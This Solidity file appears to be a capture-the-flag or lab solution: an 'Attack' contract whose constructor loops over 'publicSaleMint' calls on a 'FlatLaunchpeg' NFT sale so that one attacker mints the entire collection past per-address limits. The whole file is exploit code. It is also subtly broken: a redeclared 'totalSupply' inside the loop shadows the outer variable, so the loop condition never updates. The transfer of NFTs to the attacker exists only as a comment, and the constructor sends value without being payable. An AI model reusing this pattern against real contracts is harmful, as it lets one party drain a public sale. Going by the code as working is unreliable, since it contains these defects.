// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

import "./FlatLaunchpeg.sol";

// Next steps 
// constructor logic 
// 1. Calculate quantity to mint
// 2. Call FlatLaunchpeg to mint
// 3. Send funds to attack address (EOA which initiates the attack)
// 4. restart this loop 
// 5. loop ends once we have minted all NFTS ()

contract Attack { 


    constructor(address victimContract) {
        FlatLaunchpeg victim = FlatLaunchpeg(victimContract);
        // total amount of NFTs to mint
        uint256 collectionSize = victim.collectionSize();
        // max amount of NFTs that can be held at once
        uint256 maxPerAddressDuringMint = victim.maxPerAddressDuringMint();
        // max amount of NFTs that can be minted at once
        uint256 maxBatchSize = victim.maxBatchSize();
        // price of each NFT
        uint256 salePrice = victim.salePrice();

        // current amount that has been minted (will be 0 on local chain)
        uint256 totalSupply = victim.totalSupply();

        while(totalSupply < collectionSize) {

        uint256 amountToMint = maxBatchSize;

        if(maxBatchSize > collectionSize - totalSupply) {
            amountToMint = collectionSize - totalSupply;
        }

        victim.publicSaleMint{value: salePrice * amountToMint}(amountToMint);
        // transfer NFT to msg.sender (aka the attacker)

        // current amount that has been minted (will be 0 on local chain)
        uint256 totalSupply = victim.totalSupply();
        }


    }

}